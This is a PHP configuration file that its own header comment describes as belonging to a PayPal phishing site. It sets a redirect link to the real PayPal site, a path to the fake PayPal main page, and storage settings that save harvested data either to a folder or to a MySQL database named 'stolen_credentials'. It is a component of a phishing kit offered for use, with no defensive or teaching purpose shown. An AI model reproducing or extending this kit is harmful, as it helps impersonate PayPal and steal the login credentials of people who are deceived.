<?php
# Config file for paypal phishing site

// making link
$paypal_link = "https://www.paypal.com"; // linking
$main_page = "../paypal/"; // main page

// You can choose if you want your data stored in a mysql
// database or just in a folder like *stolen_credentials).
// set $use_db to true if you wanna use mysql. (DEFAULT: FALSE;)
$use_db = false;

// database properties
$db_host = "localhost"; // your host
$db_user = "root"; // your mysql user
$db_pass = ""; // your mysql password (DEFAULT: empty)
$db_name = "stolen_credentials"; // your database name
?>
